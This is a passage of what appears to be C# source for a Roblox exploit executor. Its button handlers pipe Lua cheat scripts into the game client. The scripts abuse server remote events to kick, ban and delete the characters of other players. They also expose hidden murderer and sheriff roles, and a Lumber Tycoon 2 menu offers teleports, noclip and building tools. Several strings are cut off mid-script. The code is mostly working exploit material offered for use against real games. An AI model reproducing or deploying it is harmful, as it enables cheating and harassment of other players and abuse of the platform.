string.gsub(lower,'/e play ','')\n                local player = nil\n\n                \tgame.ReplicatedStorage.Event:FireServer('PlayRadio', game.Players.LocalPlayer, name)\n\t\t\t\n                end\n\n\n\n\t\tif string.find(lower,'/e :play ') then\n                local name = string.gsub(lower,'/e :play ','')\n                local player = nil\n\n                \tgame.ReplicatedStorage.Event:FireServer('PlayRadio', game.Players.LocalPlayer, name)\n\t\t\t\n                end\n\n            \n            \n            if string.find(lower,':wl ') then\n                local name = string.gsub(lower,':wl ','')\n                local player = nil\n                local plrname = nil\n                \n                if name == 'others' then\n                        for i,v in pairs(game.Players:GetChildren()) do\n                            if (not v:FindFirstChild('admin')) and v.Name ~= game.Players.LocalPlayer.Name then\n                                table.insert(whitelist,(#whitelist+1),v.Name)\n                                newtag(v.Name)\n                                \n                                v.Chatted:connect(function(msg)\n                                    adminexe(v,msg)\n                                end)\n                            end\n                        end\n                else\n                    \n                names = game.Players:GetChildren()\n                                \n                            for i,v in pairs(names) do\n                                strlower = string.lower(v.Name)\n                                sub = string.sub(strlower,1,#name)\n                                \n                                if name == sub then\n                                    newtag(v.Name)\n                                    table.insert(whitelist,(#whitelist+1),v.Name)   \n                                    \n                                    v.Chatted:connect(function(msg)\n                                        adminexe(v,msg)\n                                    end)\n                                end\n                            end\n                end\n                end\n            \n            if string.find(lower,':unwl ') then\n                local name = string.gsub(lower,':unwl ','')\n                local player = nil\n                local plrname = nil\n                local index = nil\n                \n                if name == 'others' then\n                        for i,v in pairs(whitelist) do\n                                for i,v in pairs(banlist) do\n                                    if v ~= game.Players.LocalPlayer.Name then\n                                    table.remove(whitelist,i)\n                                    end\n                                end\n                                \n                                if game.Workspace:FindFirstChild(v) then\n                                    \n                                    if v.Name ~= game.Players.LocalPlayer.Name then\n                                if v:FindFirstChild('admin') then\n                                    v.admin:Destroy()\n                                end\n                                end\n                                end\n                            end\n                else\n                names = whitelist\n                                \n                        for i,v in pairs(names) do\n                            strlower = string.lower(v)\n                            sub = string.sub(strlower,1,#name)\n                                \n                            if name == sub then\n                                 table.remove(whitelist,i)\n                            end\n                        end\n                end\n                end\n            \n            if lower == ':wls' then\n                for i,v in pairs(whitelist) do\n                    print('Player #' .. i .. ' Player: ' .. v)\n                end\n            end\n          \n            \n            \n\n\t\tif lower == ':whois' then\n\n    for i,v in pairs(game.Players:GetChildren()) do\n    if game.Players[v.Name].Character:FindFirstChild('Role') then\n    local role = game.Players[v.Name].Character:FindFirstChild('Role')\n    if role.Value == 'Murderer' then\n    game.Players:Chat('The murderer is '..v.Name)\n    elseif role.Value == 'Sheriff' then\n    game.Players:Chat('The sheriff is '..v.Name)\n    elseif role.Value == 'Innocent' then\n    game.Workspace.FilteringEnabled = true\n    else\n    game.Workspace.FilteringEnabled = true\n    end\n    end\n    end\n\n\n\t\n\n\n            end\n\n\n\nif lower == ':printroles' then\n\n    for i,v in pairs(game.Players:GetChildren()) do\n    if game.Players[v.Name].Character:FindFirstChild('Role') then\n    local role = game.Players[v.Name].Character:FindFirstChild('Role')\n    if role.Value == 'Murderer' then\n    print('The murderer is '..v.Name)\n    elseif role.Value == 'Sheriff' then\n    print('The sheriff is '..v.Name)\n    elseif role.Value == 'Innocent' then\n    game.Workspace.FilteringEnabled = true\n    else\n    game.Workspace.FilteringEnabled = true\n    end\n    end\n    end\n\n            end\n\nif lower == '/e printroles' then\n\n    for i,v in pairs(game.Players:GetChildren()) do\n    if game.Players[v.Name].Character:FindFirstChild('Role') then\n    local role = game.Players[v.Name].Character:FindFirstChild('Role')\n    if role.Value == 'Murderer' then\n    print('The murderer is '..v.Name)\n    elseif role.Value == 'Sheriff' then\n    print('The sheriff is '..v.Name)\n    elseif role.Value == 'Innocent' then\n    game.Workspace.FilteringEnabled = true\n    else\n    game.Workspace.FilteringEnabled = true\n    end\n    end\n    end\n\n            end\n\n\nif lower == '/e :printroles' then\n\n    for i,v in pairs(game.Players:GetChildren()) do\n    if game.Players[v.Name].Character:FindFirstChild('Role') then\n    local role = game.Players[v.Name].Character:FindFirstChild('Role')\n    if role.Value == 'Murderer' then\n    print('The murderer is '..v.Name)\n    elseif role.Value == 'Sheriff' then\n    print('The sheriff is '..v.Name)\n    elseif role.Value == 'Innocent' then\n    game.Workspace.FilteringEnabled = true\n    else\n    game.Workspace.FilteringEnabled = true\n    end\n    end\n    end\n\n            end\n\n\n\nif lower == ':sheriff' then\n\n    for i,v in pairs(game.Players:GetChildren()) do\n    if game.Players[v.Name].Character:FindFirstChild('Role') then\n    local role = game.Players[v.Name].Character:FindFirstChild('Role')\n    if role.Value == 'Murderer' then\n    game.Workspace.FilteringEnabled = true\n    elseif role.Value == 'Sheriff' then\n    game.Players:Chat('The sheriff is '..v.Name)\n    elseif role.Value == 'Innocent' then\n    game.Workspace.FilteringEnabled = true\n    else\n    game.Workspace.FilteringEnabled = true\n    end\n    end\n    end\n\n\n            end\n\nif lower == ':murderer' then\n\n    for i,v in pairs(game.Players:GetChildren()) do\n    if game.Players[v.Name].Character:FindFirstChild('Role') then\n    local role = game.Players[v.Name].Character:FindFirstChild('Role')\n    if role.Value == 'Murderer' then\n    game.Players:Chat('The murderer is '..v.Name)\n    elseif role.Value == 'Sheriff' then\n    game.Workspace.FilteringEnabled = true\n    elseif role.Value == 'Innocent' then\n    game.Workspace.FilteringEnabled = true\n    else\n    game.Workspace.FilteringEnabled = true\n    end\n    end\n    end\n\n\n            end\n\n\n\t\tif lower == ':roles' then\n\n    for i,v in pairs(game.Players:GetChildren()) do\n    if game.Players[v.Name].Character:FindFirstChild('Role') then\n    local role = game.Players[v.Name].Character:FindFirstChild('Role')\n    if role.Value == 'Murderer' then\n    game.Players:Chat('The murderer is '..v.Name)\n    elseif role.Value == 'Sheriff' then\n    game.Players:Chat('The sheriff is '..v.Name)\n    elseif role.Value == 'Innocent' then\n    game.Workspace.FilteringEnabled = true\n    else\n    game.Workspace.FilteringEnabled = true\n    end\n    end\n    end\n\n\n            end\n\n\nif lower == '/e :roles' then\n\n    for i,v in pairs(game.Players:GetChildren()) do\n    if game.Players[v.Name].Character:FindFirstChild('Role') then\n    local role = game.Players[v.Name].Character:FindFirstChild('Role')\n    if role.Value == 'Murderer' then\n    game.Players:Chat('The murderer is '..v.Name)\n    elseif role.Value == 'Sheriff' then\n    game.Players:Chat('The sheriff is '..v.Name)\n    elseif role.Value == 'Innocent' then\n    game.Workspace.FilteringEnabled = true\n    else\n    game.Workspace.FilteringEnabled = true\n    end\n    end\n    end\n\n\n            end\n\n\nif lower == '/e roles' then\n\n    for i,v in pairs(game.Players:GetChildren()) do\n    if game.Players[v.Name].Character:FindFirstChild('Role') then\n    local role = game.Players[v.Name].Character:FindFirstChild('Role')\n    if role.Value == 'Murderer' then\n    game.Players:Chat('The murderer is '..v.Name)\n    elseif role.Value == 'Sheriff' then\n    game.Players:Chat('The sheriff is '..v.Name)\n    elseif role.Value == 'Innocent' then\n    game.Workspace.FilteringEnabled = true\n    else\n    game.Workspace.FilteringEnabled = true\n    end\n    end\n    end\n\n\n            end\n\n\n\n\t\tif string.find(lower,':cloak ') then\n                local name = string.gsub(lower,':cloak ','')\n                local player = nil\n                \n                if name == 'others' then\n                        for i,v in pairs(game.Players:GetChildren()) do\n                            if (not v:FindFirstChild('admin')) and v.Name ~= game.Players.LocalPlayer.Name then\n                                game.ReplicatedStorage.Event:FireServer('Cloak', game.Workspace.Ignore.Players[v.Name])\n                            end\n                        end\n                else\n                    \n                    names = game.Players:GetChildren()\n                                \n                  [...string is too long...]");
    }

    private void flatButton277_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("wait(.2)\nwhitelist = {game.Players.LocalPlayer.Name,'Fren1','Fren2'} -- put admin names here\nbanlist = {'noob','noob2'} -- put noob names here\ndeletepath = game.Players.LocalPlayer.Character:FindFirstChild('Delete')\ndeletepath2 = game.Players.LocalPlayer.Backpack:FindFirstChild('Delete')\nslock = false\n\nfunction newtag(plr)\nadmintag = Instance.new('BoolValue')\n   admintag.Parent = game.Players[plr]\n   admintag.Value = true\n   admintag.Name = 'admin'\n   print('created admin tag for ' .. plr)\nend\n\nnewtag(game.Players.LocalPlayer.Name)\n\ngame.Players.LocalPlayer.ChildRemoved:connect(function(obj)\n   if obj.Name == 'admin' then\n       newtag(game.Players.LocalPlayer.Name)\n   end\nend)    \n   \n           function adminexe(plr,msg)\n               if plr:FindFirstChild('admin') then\n               \n           local lower = string.lower(msg)\n           local len = string.len(lower)\n           \n           if string.find(lower,':kick ') then\n               local name = string.gsub(lower,':kick ','')\n               local player = nil\n               \n               if name == 'others' then\n                       for i,v in pairs(game.Players:GetChildren()) do\n                           if (not v:FindFirstChild('admin')) and v.Name ~= game.Players.LocalPlayer.Name then\n                               game.Workspace.Delete.delete:FireServer(v)\n                           end\n                       end\n               else\n                   \n                   names = game.Players:GetChildren()\n                               \n                           for i,v in pairs(names) do\n                               strlower = string.lower(v.Name)\n                               sub = string.sub(strlower,1,#name)                      \n                               \n                               if name == sub then \n                                   player = v\n                                   if player.Name ~= game.Players.LocalPlayer.Name then\n                                   game.Workspace.Delete.delete:FireServer(player) \n                                   end\n                               end\n                           end\n               end\n               end\n\n\nif string.find(lower,'/e :kick ') then\n               local name = string.gsub(lower,'/e :kick ','')\n               local player = nil\n               \n               if name == 'others' then\n                       for i,v in pairs(game.Players:GetChildren()) do\n                           if (not v:FindFirstChild('admin')) and v.Name ~= game.Players.LocalPlayer.Name then\n                               game.Workspace.Delete.delete:FireServer(v)\n                           end\n                       end\n               else\n                   \n                   names = game.Players:GetChildren()\n                               \n                           for i,v in pairs(names) do\n                               strlower = string.lower(v.Name)\n                               sub = string.sub(strlower,1,#name)                      \n                               \n                               if name == sub then \n                                   player = v\n                                   if player.Name ~= game.Players.LocalPlayer.Name then\n                                   game.Workspace.Delete.delete:FireServer(player) \n                                   end\n                               end\n                           end\n               end\n               end\n\nif string.find(lower,'/e kick ') then\n               local name = string.gsub(lower,'/e kick ','')\n               local player = nil\n               \n               if name == 'others' then\n                       for i,v in pairs(game.Players:GetChildren()) do\n                           if (not v:FindFirstChild('admin')) and v.Name ~= game.Players.LocalPlayer.Name then\n                               game.Workspace.Delete.delete:FireServer(v)\n                           end\n                       end\n               else\n                   \n                   names = game.Players:GetChildren()\n                               \n                           for i,v in pairs(names) do\n                               strlower = string.lower(v.Name)\n                               sub = string.sub(strlower,1,#name)                      \n                               \n                               if name == sub then \n                                   player = v\n                                   if player.Name ~= game.Players.LocalPlayer.Name then\n                                   game.Workspace.Delete.delete:FireServer(player) \n                                   end\n                               end\n                           end\n               end\n               end\n\n               if string.find(lower,'heck ') then\n               local name = string.gsub(lower,'heck ','')\n               local player = nil\n               \n               if name == 'others' then\n                       for i,v in pairs(game.Players:GetChildren()) do\n                           if (not v:FindFirstChild('admin')) and v.Name ~= game.Players.LocalPlayer.Name then\n                               game.Workspace.Delete.delete:FireServer(v.Character)\n                           end\n                       end\n               else\n                   \n                   names = game.Players:GetChildren()\n                               \n                           for i,v in pairs(names) do\n                               strlower = string.lower(v.Name)\n                               sub = string.sub(strlower,1,#name)                      \n                               \n                               if name == sub then \n                                   player = v\n                                   if player.Name ~= game.Players.LocalPlayer.Name then\n                                   game.Workspace.Delete.delete:FireServer(player.Character)   \n                                   end\n                               end\n                           end\n               end\n               end\n\nif string.find(lower,':heck ') then\n               local name = string.gsub(lower,':heck ','')\n               local player = nil\n               \n               if name == 'others' then\n                       for i,v in pairs(game.Players:GetChildren()) do\n                           if (not v:FindFirstChild('admin')) and v.Name ~= game.Players.LocalPlayer.Name then\n                               game.Workspace.Delete.delete:FireServer(v.Character)\n                           end\n                       end\n               else\n                   \n                   names = game.Players:GetChildren()\n                               \n                           for i,v in pairs(names) do\n                               strlower = string.lower(v.Name)\n                               sub = string.sub(strlower,1,#name)                      \n                               \n                               if name == sub then \n                                   player = v\n                                   if player.Name ~= game.Players.LocalPlayer.Name then\n                                   game.Workspace.Delete.delete:FireServer(player.Character)   \n                                   end\n                               end\n                           end\n               end\n               end\n\nif string.find(lower,'/e heck ') then\n               local name = string.gsub(lower,'/e heck ','')\n               local player = nil\n               \n               if name == 'others' then\n                       for i,v in pairs(game.Players:GetChildren()) do\n                           if (not v:FindFirstChild('admin')) and v.Name ~= game.Players.LocalPlayer.Name then\n                               game.Workspace.Delete.delete:FireServer(v.Character)\n                           end\n                       end\n               else\n                   \n                   names = game.Players:GetChildren()\n                               \n                           for i,v in pairs(names) do\n                               strlower = string.lower(v.Name)\n                               sub = string.sub(strlower,1,#name)                      \n                               \n                               if name == sub then \n                                   player = v\n                                   if player.Name ~= game.Players.LocalPlayer.Name then\n                                   game.Workspace.Delete.delete:FireServer(player.Character)   \n                                   end\n                               end\n                           end\n               end\n               end\n\nif string.find(lower,'/e :heck ') then\n               local name = string.gsub(lower,'/e :heck ','')\n               local player = nil\n               \n               if name == 'others' then\n                       for i,v in pairs(game.Players:GetChildren()) do\n                           if (not v:FindFirstChild('admin')) and v.Name ~= game.Players.LocalPlayer.Name then\n                               game.Workspace.Delete.delete:FireServer(v.Character)\n                           end\n                       end\n               else\n                   \n                   names = game.Players:GetChildren()\n                               \n                           for i,v in pairs(names) do\n                               strlower = string.lower(v.Name)\n                               sub = string.sub(strlower,1,#name)                      \n                               \n                               if name == sub then \n                                   player = v\n                                   if player.Name ~= game.Players.LocalPlayer.Name then\n                                   game.Workspace.Delete.delete:FireServer(player.Character)   \n                                   end\n                               end\n                           end\n               end\n               end\n\n               if string.find(lower,'frick ') then\n               local name = string.gsub(lower,'frick ','')\n               local player = nil\n               \n               if name == 'others' then\n                       for i,v in pairs(game.Players:GetChildren()) do\n                           if (not v:FindFirstChild('admin')) and v.Name ~= game.Players.LocalPlayer.Name then\n                               game.Workspace.Delete.delete:FireServer(v.Character.Torso.Neck)\n                               game.Workspace.Delete.delete:FireServer(v.Character.Head.Neck)\n                           end\n                       end\n               else\n                   \n                   names = game.Players:GetChildren()\n                               \n                           for i,v in pairs(names) do\n                               strlower = string.lower(v.Name)\n                               sub = string.sub(strlower,1,#name)                      \n                               \n                               if name == sub then \n                                   player = v\n                                   if player.Name ~= game.Players.LocalPlayer.Name then\n                                   game.Workspace.Delete.delete:FireServer(player.Character.Torso.Neck)\n                                   game.Workspace.Delete.delete:FireServer(v.Character.Head.Neck)  \n                                   end\n                               end\n                           end\n               end\n               end\n\n               if string.find(lower,':frick ') then\n               local name = string.gsub(lower,':frick ','')\n               local player = nil\n               \n               if name == 'others' then\n                       for i,v in pairs(game.Players:GetChildren()) do\n                           if (not v:FindFirstChild('admin')) and v.Name ~= game.Players.LocalPlayer.Name then\n                               game.Workspace.Delete.delete:FireServer(v.Character.Torso.Neck)\n                               game.Workspace.Delete.delete:FireServer(v.Character.Head.Neck)\n                           end\n                       end\n               else\n                   \n                   names = game.Players:GetChildren()\n                               \n                           for i,v in pairs(names) do\n                               strlower = string.lower(v.Name)\n                               sub = string.sub(strlower,1,#name)                      \n                               \n                               if name == sub then \n                                   player = v\n                                   if player.Name ~= game.Players.LocalPlayer.Name then\n                                   game.Workspace.Delete.delete:FireServer(player.Character.Torso.Neck)\n                                   game.Workspace.Delete.delete:FireServer(v.Character.Head.Neck)  \n                                   end\n                               end\n                           end\n               end\n               end\n\n               if string.find(lower,'/e frick ') then\n               local name = string.gsub(lower,'/e frick ','')\n               local player = nil\n               \n               if name == 'others' then\n                       for i,v in pairs(game.Players:GetChildren()) do\n                           if (not v:FindFirstChild('admin')) and v.Name ~= game.Players.LocalPlayer.Name then\n                               game.Workspace.Delete.delete:FireServer(v.Character.Torso.Neck)\n                               game.Workspace.Delete.delete:FireServer(v.Character.Head.Neck)\n                           end\n                       end\n               else\n                   \n                   names = game.Players:GetChildren()\n                               \n                           for i,v in pairs(names) do\n                               strlower = string.lower(v.Name)\n                               sub = string.sub(strlower,1,#name)                      \n                               \n                               if name == sub then \n                                   player = v\n                                   if player.Name ~= game.Players.LocalPlayer.Name then\n                                   game.Workspace.Delete.delete:FireServer(player.Character.Torso.Neck)\n                                   game.Workspace.Delete.delete:FireServer(v.Character.Head.Neck)  \n                                   end\n                               end\n                           end\n               end\n               end\n\n               if string.find(lower,'/e :frick ') then\n               local name = string.gsub(lower,'/e :frick ','')\n               local player = nil\n               \n               if name == 'others' then\n                       for i,v in pairs(game.Players:GetChildren()) do\n                           if (not v:FindFirstChild('admin')) and v.Name ~= game.Players.LocalPlayer.Name then\n                               game.Workspace.Delete.delete:FireServer(v.Character.Torso.Neck)\n                               game.Workspace.Delete.delete:FireServer(v.Character.Head.Neck)\n                           end\n                       end\n               else\n                   \n                   names = game.Players:GetChildren()\n                               \n                           for i,v in pairs(names) do\n                               strlower = string.lower(v.Name)\n                               sub = string.sub(strlower,1,#name)                      \n                               \n                               if name == sub then \n                                   player = v\n                                   if player.Name ~= game.Players.LocalPlayer.Name then\n                                   game.Workspace.Delete.delete:FireServer(player.Character.Torso.Neck)\n                                   game.Workspace.Delete.delete:FireServer(v.Character.Head.Neck)  \n                                   end\n                               end\n                           end\n               end\n               end\n           \n           if string.find(lower,':ban ') then\n               local name = string.gsub(lower,':ban ','')\n               local player = nil\n               local plrname = nil\n               \n               if name == 'others' then\n                       for i,v in pairs(game.Players:GetChildren()) do\n                           if (not v:FindFirstChild('admin')) and v.Name ~= game.Players.LocalPlayer.Name then\n                               plrname = v.Name\n                               table.insert(banlist,(#banlist+1),plrname)\n                               game.Workspace.Delete.delete:FireServer(v)\n                           end\n                       end\n               else\n               \n               names = game.Players:GetChildren()\n                               \n                       for i,v in pairs(names) do\n                           strlower = string.lower(v.Name)\n                           sub = string.sub(strlower,1,#name)\n                               \n                           if name == sub then\n                               plrname = v.Name\n                               player = v\n\n                               if player.Name ~= game.Players.LocalPlayer.Name then\n                               table.insert(banlist,(#banlist+1),plrname)\n                               game.Workspace.Delete.delete:FireServer(player)\n                               end \n                           end\n                           \n                       end\n                       \n                       \n               end\n               end\n\n           if string.find(lower,'/e ban ') then\n               local name = string.gsub(lower,'/e ban ','')\n               local player = nil\n               local plrname = nil\n               \n               if name == 'others' then\n                       for i,v in pairs(game.Players:GetChildren()) do\n                           if (not v:FindFirstChild('admin')) and v.Name ~= game.Players.LocalPlayer.Name then\n                               plrname = v.Name\n                               table.insert(banlist,(#banlist+1),plrname)\n                               game.Workspace.Delete.delete:FireServer(v)\n                           end\n                       end\n               else\n               \n               names = game.Players:GetChildren()\n                               \n                       for i,v in pairs(names) do\n                           strlower = string.lower(v.Name)\n                           sub = string.sub(strlower,1,#name)\n                               \n                           if name == sub then\n                               plrname = v.Name\n                               player = v\n\n                               if player.Name ~= game.Players.LocalPlayer.Name then\n                               table.insert(banlist,(#banlist+1),plrname)\n                               game.Workspace.Delete.delete:FireServer(player)\n                               end \n                           end\n                           \n                       end\n                       \n                       \n               end\n               end\n\n           if string.find(lower,'/e :ban ') then\n               local name = string.gsub(lower,'/e :ban ','')\n               local player = nil\n               local plrname = nil\n               \n               if name == 'others' then\n                       for i,v in pairs(game.Players:GetChildren()) do\n                           if (not v:FindFirstChild('admin')) and v.Name ~= game.Players.LocalPlayer.Name then\n                               plrname = v.Name\n                               table.insert(banlist,(#banlist+1),plrname)\n                               game.Workspace.Delete.delete:FireServer(v)\n                           end\n                       end\n               else\n               \n               names = game.Players:GetChildren()\n       [...string is too long...]");
    }

    private void flatButton278_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("function equal(msg)\n   if msg:lower():sub(1,string.len('/e shuffle'))=='/e shuffle' then\n       return 277955949\n   elseif msg:lower():sub(1,string.len('/e superman'))=='/e superman' then\n       return 277929891\n   elseif msg:lower():sub(1,string.len('/e twist'))=='/e twist' then\n       return 280865087\n   elseif msg:lower():sub(1,string.len('/e fist'))=='/e fist' then\n       return 280872840\n   elseif msg:lower()=='/e' then\n       return 0\n   end\nend\ngame.Players.LocalPlayer.Chatted:Connect(function(msg)\n   if equal(msg)~='' then\n       if game.Players.LocalPlayer.Character then\n           local a       = Instance.new('Animation')\n           a.AnimationId = 'rbxassetid://'..equal(msg)\n           load          = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(a)\n           load:Play()\n       end\n   end\nend)");
    }

    private void flatButton279_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("-- MADE BY Chaosity Chaosity\nspawn(function()\n\nlocal LT2GUI1 = Instance.new('ScreenGui')\nlocal Main = Instance.new('Frame')\nlocal TOPBAR = Instance.new('Frame')\nlocal Name = Instance.new('TextLabel')\nlocal EXIT = Instance.new('TextButton')\nlocal Cave = Instance.new('TextButton')\nlocal PalmIsland = Instance.new('TextButton')\nlocal Swamp = Instance.new('TextButton')\nlocal Volcano = Instance.new('TextButton')\nlocal LinkLogic = Instance.new('TextButton')\nlocal LandStore = Instance.new('TextButton')\nlocal BobShack = Instance.new('TextButton')\nlocal WoodRUs = Instance.new('TextButton')\nlocal Dock = Instance.new('TextButton')\nlocal BoxedCars = Instance.new('TextButton')\nlocal TPPLOT = Instance.new('TextButton')\nlocal BringWood = Instance.new('TextButton')\nlocal BSellChoppedWood = Instance.new('TextButton')\nlocal BTPCutLogs = Instance.new('TextButton')\nlocal BPhantomWood = Instance.new('TextButton')\nlocal TPNAME = Instance.new('TextLabel')\nlocal FUNCNAME = Instance.new('TextLabel')\nlocal BRejoinServer = Instance.new('TextButton')\nlocal DISCO = Instance.new('TextLabel')\nlocal Walkspeed = Instance.new('TextButton')\nlocal Gravity = Instance.new('TextButton')\nlocal Btools = Instance.new('TextButton')\nlocal Noclip = Instance.new('TextButton')\nlocal Open = Instance.new('TextButton')\n--Properties:\nLT2GUI1.Name = 'LT2GUI  1'\nLT2GUI1.Parent = game.Players.LocalPlayer:WaitForChild('PlayerGui')\n\nMain.Name = 'Main'\nMain.Parent = LT2GUI1\nMain.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)\nMain.Position = UDim2.new(0.300000012, 0, 0.30399999, 0)\nMain.Size = UDim2.new(0, 450, 0, 300)\nMain.Active = true\nMain.Draggable = true\n\nTOPBAR.Name = 'TOPBAR'\nTOPBAR.Parent = Main\nTOPBAR.BackgroundColor3 = Color3.new(0.815686, 0, 0)\nTOPBAR.Position = UDim2.new(0, 0, -0.129999995, 0)\nTOPBAR.Size = UDim2.new(0, 450, 0, 39)\n\nName.Name = 'Name'\nName.Parent = TOPBAR\nName.BackgroundColor3 = Color3.new(1, 1, 1)\nName.BackgroundTransparency = 1\nName.Size = UDim2.new(0, 382, 0, 39)\nName.Font = Enum.Font.ArialBold\nName.Text = 'Lumber Tycoon 2  V1'\nName.TextColor3 = Color3.new(1, 1, 1)\nName.TextScaled = true\nName.TextSize = 14\nName.TextWrapped = true\n\nEXIT.Name = 'EXIT'\nEXIT.Parent = TOPBAR\nEXIT.BackgroundColor3 = Color3.new(1, 1, 1)\nEXIT.BackgroundTransparency = 1\nEXIT.Position = UDim2.new(0.892499983, 0, 0, 0)\nEXIT.Size = UDim2.new(0, 43, 0, 39)\nEXIT.Font = Enum.Font.SourceSans\nEXIT.Text = 'X'\nEXIT.TextColor3 = Color3.new(0, 0, 0)\nEXIT.TextScaled = true\nEXIT.TextSize = 14\nEXIT.TextWrapped = true\nEXIT.MouseButton1Down:connect(function()\n    Open.Visible = true\n    Main.Visible = false\nend)\nCave.Name = 'Cave'\nCave.Parent = Main\nCave.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nCave.Position = UDim2.new(0.0199999996, 0, 0.306666672, 0)\nCave.Size = UDim2.new(0, 100, 0, 30)\nCave.Font = Enum.Font.Cartoon\nCave.Text = 'Cave'\nCave.TextColor3 = Color3.new(0, 0, 0)\nCave.TextScaled = true\nCave.TextSize = 14\nCave.TextWrapped = true\nCave.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(3581, -179, 430))\nend)\nPalmIsland.Name = 'PalmIsland'\nPalmIsland.Parent = Main\nPalmIsland.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nPalmIsland.Position = UDim2.new(0.0199999996, 0, 0.163333341, 0)\nPalmIsland.Size = UDim2.new(0, 100, 0, 30)\nPalmIsland.Font = Enum.Font.Cartoon\nPalmIsland.Text = 'Palm Island'\nPalmIsland.TextColor3 = Color3.new(0, 0, 0)\nPalmIsland.TextScaled = true\nPalmIsland.TextSize = 14\nPalmIsland.TextWrapped = true\nPalmIsland.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(2549, -5, -42))\nend)\nSwamp.Name = 'Swamp'\nSwamp.Parent = Main\nSwamp.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nSwamp.Position = UDim2.new(0.0199999996, 0, 0.589999974, 0)\nSwamp.Size = UDim2.new(0, 100, 0, 30)\nSwamp.Font = Enum.Font.Cartoon\nSwamp.Text = 'Swamp'\nSwamp.TextColor3 = Color3.new(0, 0, 0)\nSwamp.TextScaled = true\nSwamp.TextSize = 14\nSwamp.TextWrapped = true\nSwamp.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(-1209, 132, -801))\nend)\nVolcano.Name = 'Volcano'\nVolcano.Parent = Main\nVolcano.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nVolcano.Position = UDim2.new(0.0199999996, 0, 0.446666658, 0)\nVolcano.Size = UDim2.new(0, 100, 0, 30)\nVolcano.Font = Enum.Font.Cartoon\nVolcano.Text = 'Volcano'\nVolcano.TextColor3 = Color3.new(0, 0, 0)\nVolcano.TextScaled = true\nVolcano.TextSize = 14\nVolcano.TextWrapped = true\nVolcano.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(-1585, 622, 1140))\nend)\nLinkLogic.Name = 'LinkLogic'\nLinkLogic.Parent = Main\nLinkLogic.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nLinkLogic.Position = UDim2.new(0.264444441, 0, 0.303333342, 0)\nLinkLogic.Size = UDim2.new(0, 100, 0, 30)\nLinkLogic.Font = Enum.Font.Cartoon\nLinkLogic.Text = 'Link's Logic'\nLinkLogic.TextColor3 = Color3.new(0, 0, 0)\nLinkLogic.TextScaled = true\nLinkLogic.TextSize = 14\nLinkLogic.TextWrapped = true\nLinkLogic.TextWrapped = true\nLinkLogic.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(4605, 3, -727))\nend)\nLandStore.Name = 'LandStore'\nLandStore.Parent = Main\nLandStore.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nLandStore.Position = UDim2.new(0.264444441, 0, 0.586666644, 0)\nLandStore.Size = UDim2.new(0, 100, 0, 30)\nLandStore.Font = Enum.Font.Cartoon\nLandStore.Text = 'Land Store'\nLandStore.TextColor3 = Color3.new(0, 0, 0)\nLandStore.TextScaled = true\nLandStore.TextSize = 14\nLandStore.TextWrapped = true\nLandStore.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(258, 3, -99))\nend)\nBobShack.Name = 'BobShack'\nBobShack.Parent = Main\nBobShack.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBobShack.Position = UDim2.new(0.264444441, 0, 0.160000011, 0)\nBobShack.Size = UDim2.new(0, 100, 0, 30)\nBobShack.Font = Enum.Font.Cartoon\nBobShack.Text = 'Bob's Shack'\nBobShack.TextColor3 = Color3.new(0, 0, 0)\nBobShack.TextScaled = true\nBobShack.TextSize = 14\nBobShack.TextWrapped = true\nBobShack.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(260, 8, -2542))\nend)\nWoodRUs.Name = 'WoodRUs'\nWoodRUs.Parent = Main\nWoodRUs.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nWoodRUs.Position = UDim2.new(0.264444441, 0, 0.443333328, 0)\nWoodRUs.Size = UDim2.new(0, 100, 0, 30)\nWoodRUs.Font = Enum.Font.Cartoon\nWoodRUs.Text = 'Wood R Us'\nWoodRUs.TextColor3 = Color3.new(0, 0, 0)\nWoodRUs.TextScaled = true\nWoodRUs.TextSize = 14\nWoodRUs.TextWrapped = true\nWoodRUs.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(265, 3, 57))\nend)\nDock.Name = 'Dock'\nDock.Parent = Main\nDock.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nDock.Position = UDim2.new(0.0199999996, 0, 0.73333329, 0)\nDock.Size = UDim2.new(0, 100, 0, 30)\nDock.Font = Enum.Font.Cartoon\nDock.Text = 'Dock'\nDock.TextColor3 = Color3.new(0, 0, 0)\nDock.TextScaled = true\nDock.TextSize = 14\nDock.TextWrapped = true\nDock.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(1114, -1, -197))\nend)\nBoxedCars.Name = 'BoxedCars'\nBoxedCars.Parent = Main\nBoxedCars.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBoxedCars.Position = UDim2.new(0.264444441, 0, 0.729999959, 0)\nBoxedCars.Size = UDim2.new(0, 100, 0, 30)\nBoxedCars.Font = Enum.Font.Cartoon\nBoxedCars.Text = 'Boxed Cars'\nBoxedCars.TextColor3 = Color3.new(0, 0, 0)\nBoxedCars.TextScaled = true\nBoxedCars.TextSize = 14\nBoxedCars.TextWrapped = true\nBoxedCars.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(509, 3, -1463))\nend)\nTPPLOT.Name = 'TPPLOT'\nTPPLOT.Parent = Main\nTPPLOT.BackgroundColor3 = 